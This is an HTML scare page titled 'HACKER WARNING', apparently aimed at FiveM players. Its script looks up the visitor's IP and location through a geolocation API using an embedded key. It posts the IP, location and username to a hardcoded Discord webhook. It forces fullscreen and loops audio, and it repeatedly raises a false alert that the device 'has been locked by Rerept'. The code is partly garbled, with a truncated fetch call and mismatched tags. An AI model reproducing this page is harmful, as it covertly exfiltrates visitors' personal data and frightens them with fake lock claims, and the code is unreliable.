<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HACKER WARNING</title>
  <style>
    body {
      margin: 0;
      background: black;
      overflow: hidden;
      color: red;
      font-family: Arial, sans-serif;
    }

    #overlay {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 35px;
      font-weight: bold;
      animation: blink 1s infinite;
      z-index: 2;
    }

    #ipBox {
      position: absolute;
      top: 50%;
      left: 5px; /* Move to middle-left */
      transform: translateY(-50%);
      color: lime;
      font-size: 18px;
      z-index: 2;
      font-family: monospace;
    }
	
    #clickText {
      position: absolute;
      bottom: 20px;
      width: 100%;
      text-align: center;
      color: white;
      font-size: 20px;
      z-index: 2;
    }

    video {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      z-index: 0;
    }

    @keyframes blink {
      50% { opacity: 0; }
    }
  </style>
</head>

<body>

<script>
  const API_KEY = '704aa5f136d9423db0c64a593a6b7c27';
  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489754745626431641/FlXQQJ9LxTYWEQrhWXph0bSfRzcUZGe8-1nYrM1KQjF0xRAm7kmNXI14YdHyMllEXAmZ';

  function fetchUserIpAndLocation(fivemUsername) {
    const ipBox = document.getElementById('ipBox');
    
    // Fetch IP and location data
    fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`)
      .then(response => response.json())
      .then(data => {
        // Update the content of ipBox with the fetched data
        ipBox.innerText =

          `Fivem Username: ${fivemUsername || 'Unknown'}\n` +
          `Location: ${data.city}, ${data.country_name}\n` +
          'Uploading files...';

          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            content: `User Data:\nIP: ${data.ip}\nFivem Username: ${fivemUsername || 'Unknown'}\nLocation: ${data.city}, ${data.country_name}`
          })
        }).then(response => response.json())
          .catch(error => console.error('Error:', error));

</video>

<audio id="sound" autoplay loop>

</audio>

<script>
const v = document.getElementById("vid");
const s = document.getElementById("sound");

document.documentElement.requestFullscreen().catch(()=>{});

function unlockAudio() {
    v.muted = false;
    v.volume = 1.0;
    v.play().catch(()=>{});

    s.muted = false;
    s.volume = 1.0;
    s.play().catch(()=>{});

    document.removeEventListener("click", unlockAudio);
    document.getElementById("clickText").style.display = "none";
}

document.addEventListener("click", unlockAudio);

setInterval(unlockAudio, 1000);

setInterval(() => {
    alert("Your device has been locked by Rerept");
}, 15000);

</script>
